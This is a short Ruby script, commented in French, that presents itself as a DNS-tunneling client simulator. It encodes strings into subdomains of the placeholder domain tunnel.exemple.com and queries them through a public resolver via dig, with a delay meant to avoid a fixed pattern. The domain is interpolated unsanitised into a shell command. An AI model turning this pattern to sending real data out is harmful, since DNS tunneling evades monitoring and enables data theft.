require 'socket'
require 'base64'

# Ce script simule un client de DNS tunneling avancé
# Il génère des requêtes contenant des données encodées
# et tente de simuler le comportement d'un client réel.

class DNSClientSimulator
  def initialize(base_domain)
    @base_domain = base_domain
    @resolver = '8.8.8.8' # Utilisation de Google DNS pour la simulation
  end

  def send_payload(data)
    # Encodage URL-safe pour éviter les caractères problématiques dans le DNS
    encoded_payload = Base64.urlsafe_encode64(data, padding: '').gsub('=', '')
    query_domain = "#{encoded_payload}.#{@base_domain}"
    
    puts "[CLIENT] Envoi du payload : #{data}"
    puts "[CLIENT] Requête générée : #{query_domain}"
    
    execute_dig(query_domain)
  end

  private

  def execute_dig(domain)
    # Utilisation de la commande système dig pour la simulation
    # Dans un vrai tunnel, on utiliserait des sockets UDP bruts
    cmd = "dig @#{@resolver} #{domain} TXT +short"
    result = `#{cmd}`.strip
    
    if result.empty?
      puts "[RESULT] Aucune réponse reçue (le serveur n'est pas configuré)."
    else
      puts "[RESULT] Réponse du serveur : #{result}"
    end
  rescue => e
    puts "[ERROR] Erreur lors de la requête : #{e.message}"
  end
end

# --- Exécution du simulateur ---

# Note: Ce script ne fonctionnera pas sans un serveur DNS configuré
# pour répondre à 'tunnel.exemple.com'.
simulator = DNSClientSimulator.new('tunnel.exemple.com')

puts "--- Début de la simulation de tunneling ---"
payloads = ["hello", "ruby_is_great", "secret_data_123"]

payloads.each_with_index do |p, i|
  puts "\nÉtape #{i+1}:"
  simulator.send_payload(p)
  sleep(1) # Simulation d'un intervalle pour éviter le pattern fixe
end

puts "\n--- Fin de la simulation ---"